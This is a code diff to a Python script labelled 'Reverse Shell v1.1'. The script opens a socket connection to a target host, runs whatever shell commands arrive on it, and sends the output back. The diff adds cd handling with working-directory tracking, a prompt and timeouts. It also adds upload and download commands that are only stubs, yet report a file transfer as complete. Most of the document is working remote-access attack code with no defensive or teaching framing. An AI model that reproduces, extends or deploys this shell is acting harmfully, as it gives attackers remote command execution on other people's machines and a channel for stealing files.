@@ -4,15 +4,12 @@ import socket
 import argparse
 import errno
 import sys
+import platform
+import os
 
-""" Reverse Shell v1 """
+""" Reverse Shell v1.1 """
 """ Establishes a simple reverse shell connection """
 """ Does not support commands like cd, alias, etc. """
-
-# To-Do:
-# [ ] Add input handling stability for built-in shell commands
-# [ ] Add persistent cwd tracking
-
 
 # Arguments
 def get_args():
@@ -48,31 +45,86 @@ def connect(target, port):
         elif e.errno == errno.EADDRINUSE:
             print("[-] Port already in use")
         else:
-            print(f"A general socket error occurred: {e}")
+            print(f"A general socket error occurred: {e}\n")
 
 # Once session is established
 def session(s):
+    current_dir = os.getcwd()
+    s.settimeout(30.0) # Increase this or remove later to make shell more stable
+    
     try:
-        s.send(b"[+] Session established\n") # Debug
+        s.send(b"[+] Session established\n")
+
         while True:
-            #command = input("> ")
-            command = s.recv(4096).decode().strip()
+            # Set cwd as prompt
+            s.send(f"\n[{current_dir}]> ".encode())
+
+            # Receive command from user input
+            command = s.recv(4096).decode().strip() 
+
+            # Special commands
             if command.lower() == "exit":
                 break
-            prochandle = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            results, errors = prochandle.communicate()
-            results += errors
-            print(f"{command}: {results.decode()}")
-            s.send(results)
-    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-        print("Client disconnected or connection error occurred.")
+            elif command.lower().startswith("cd"):
+                previous_dir = current_dir
+                target_dir = command[2:].strip() if command.lower().startswith("cd ") else "" # Error handling for empty cd commands
+                try:
+                    if not target_dir: # If user enters nothing after cd, change to user's home directory
+                        target_dir = os.path.expanduser("~")
+                    print(f"Changing directory to {target_dir}")
+                    os.chdir(target_dir)
+                    current_dir = os.getcwd() # Update current_dir
+                except (FileNotFoundError, PermissionError) as e:
+                    s.send(f"[-] An error occurred: {e}\n".encode())
+                    current_dir = previous_dir
+
+            elif command.lower() == "upload":
+                upload(s)
+                #continue
+            elif command.lower() == "download":
+                download(s)
+                #continue
+            # If not a special circumstance, execute other commands as normal
+            else: 
+                prochandle = subprocess.Popen(command, cwd=current_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                results, errors = prochandle.communicate(timeout=60.0)
+                results += errors
+                print(f"{command}: {results.decode()}") # Debug: Echo commands
+                s.send(results) # Send output back to client
+
     except Exception as e:
-        print(f"An general connection error occurred: {e}")
+        print(f"[-] An error occurred: {e}\n")
     finally:
         s.close()
-        print("Session closed.")
+        print("[-] Session closed.")
 
+# Upload
+def upload(s):
+    s.send("[+] Specify full path of file to upload: ".encode())
+    upfile = s.recv(4096).decode().strip()
+    s.send("[+] Specify full path of destination: ".encode())
+    dest = s.recv(4096).decode().strip()
 
+    try:
+        # Code to upload file from upfile to dest
+        s.send("[+] File upload complete.\n".encode())
+    except:
+        s.send("[-] File upload failed. Check paths and permissions.\n".encode())
+
+# Download
+def download(s):
+    s.send("[+] Specify full path of file to download: ".encode())
+    downfile = s.recv(4096).decode().strip()
+    s.send("[+] Specify full path of destination: ".encode())
+    dest = s.recv(4096).decode().strip()
+
+    try:
+        # Code to download file from upfile to dest
+        s.send("[+] File download complete.\n".encode())
+    except:
+        s.send("[-] File download failed. Check paths and permissions.\n".encode())
+
+# Main
 def main():
     args, parser = get_args()   # args = Defined arguments specified by user, parser = script settings
 
